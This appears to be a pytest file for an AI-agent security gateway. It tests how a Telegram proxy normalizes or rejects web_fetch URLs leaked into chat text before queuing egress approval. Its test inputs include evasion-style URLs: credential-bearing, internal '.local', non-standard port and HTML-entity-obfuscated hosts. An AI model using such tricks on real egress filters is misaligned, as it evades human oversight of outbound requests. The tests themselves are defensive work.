    async def test_raw_web_fetch_json_consecutive_dot_domain_does_not_queue_approval(self, monkeypatch):
        """Consecutive-dot domains should be rejected before approval queueing."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://good..example.com\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_domain_with_invalid_chars_does_not_queue_approval(self, monkeypatch):
        """Domains containing invalid hostname characters must be rejected."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://exa_mple.com\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_trailing_quote_still_queues_approval(self, monkeypatch):
        """Trailing quote punctuation in leaked URL should still normalize and queue approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather.com\\\"\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_non_http_scheme_does_not_queue_approval(self, monkeypatch):
        """Non-http schemes should never queue web-fetch approvals."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"ftp://weather.com/archive.txt\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_userinfo_url_does_not_queue_approval(self, monkeypatch):
        """URLs with credentials should not be queued for web-fetch approvals."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://admin:secret@weather.com/private\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_non_standard_port_does_not_queue_approval(self, monkeypatch):
        """web_fetch approvals should not queue for non-standard destination ports."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather.com:8443/status\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_internal_suffix_domain_does_not_queue_approval(self, monkeypatch):
        """Internal pseudo-TLD hosts should be rejected from approval queue."""
        calls = {"count": 0}

        class FakeEgress:
            async def check_async(self, **_kwargs):
                calls["count"] += 1
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather.local/today\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert calls["count"] == 0
        assert "approval request queued" not in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_uppercase_http_scheme_queues_port_80_approval(self, monkeypatch):
        """Uppercase HTTP schemes should normalize and queue on port 80."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"HTTP://weather.com/today\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "http://weather.com"
        assert called["kwargs"]["port"] == 80
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_scheme_relative_url_queues_https_approval(self, monkeypatch):
        """Scheme-relative URLs in leaked JSON should normalize to HTTPS approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"//weather.com/today\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert called["kwargs"]["port"] == 443
        assert "approval request queued" in result["text"].lower()

    @pytest.mark.asyncio
    async def test_raw_web_fetch_json_url_with_html_entity_domain_still_queues_approval(self, monkeypatch):
        """HTML-entity encoded domains in leaked JSON should normalize before approval."""
        called = {"value": False}

        class FakeEgress:
            async def check_async(self, **kwargs):
                called["value"] = True
                called["kwargs"] = kwargs
                return SimpleNamespace(action="deny")

        from gateway.ingest_api import state as state_module

        monkeypatch.setattr(
            state_module,
            "app_state",
            SimpleNamespace(egress_filter=FakeEgress()),
        )
        proxy = TelegramAPIProxy(sanitizer=_make_sanitizer())
        body = json.dumps(
            {
                "chat_id": "8096968754",
                "text": "{\"name\":\"web_fetch\",\"arguments\":{\"url\":\"https://weather&#46;com/weather/today\"}}",
            }
        ).encode()

        result = json.loads(await proxy._filter_outbound(body, "application/json"))
        await asyncio.sleep(0)

        assert called["value"] is True
        assert called["kwargs"]["destination"] == "https://weather.com"
        assert "approval request queued" in result["text"].lower()

    def test_sanitize_reason_hides_internal_paths(self):
        """User-facing block reasons should not expose modules or file paths."""
        reason = (
            "ContextGuard failed at gateway.security.context_guard "
            "/app/agentshroud/gateway/security/context_guard.py line 22"
        )
        sanitized = TelegramAPIProxy._sanitize_reason(reason)
        assert "gateway.security.context_guard" not in sanitized
        assert "/app/agentshroud" not in sanitized

    @pytest.mark.asyncio
    async def test_forward_to_telegram_returns_http_error_json(self, monkeypatch):
        """HTTPError JSON payloads should be returned as structured API responses."""
        proxy = TelegramAPIProxy()

        def _raise_http_error(*args, **kwargs):
            raise urllib.error.HTTPError(
                url="https://api.telegram.org/botXXX/sendMessage",
                code=400,
                msg="Bad Request",
                hdrs=None,
                fp=io.BytesIO(
                    b'{"ok":false,"error_code":400,"description":"Bad Request: chat not found"}'
                ),
            )

        monkeypatch.setattr(urllib.request, "urlopen", _raise_http_error)
        result = await proxy._forward_to_telegram(
            "https://api.telegram.org/botXXX/sendMessage",
            json.dumps({"chat_id": "bad", "text": "x"}).encode(),
            "application/json",
        )

        assert result["ok"] is False
        assert result["error_code"] == 400
        assert "chat not found" in result["description"].lower()

    @pytest.mark.asyncio
    async def test_forward_to_telegram_handles_http_error_non_json(self, monkeypatch):
        """Non-JSON HTTPError payloads should still produce a safe fallback dict."""
        proxy = TelegramAPIProxy()

        def _raise_http_error(*args, **kwargs):
            raise urllib.error.HTTPError(
                url="https://api.telegram.org/botXXX/sendMessage",
                code=500,
                msg="Internal Server Error",
                hdrs=None,
                fp=io.BytesIO(b"gateway failure"),
            )

        monkeypatch.setattr(urllib.request, "urlopen", _raise_http_error)
        result = await proxy._forward_to_telegram(
            "https://api.telegram.org/botXXX/sendMessage",
            json.dumps({"chat_id": "1", "text": "x"}).encode(),
            "application/json",
        )

        assert result["ok"] is False
        assert result["error_code"] == 500
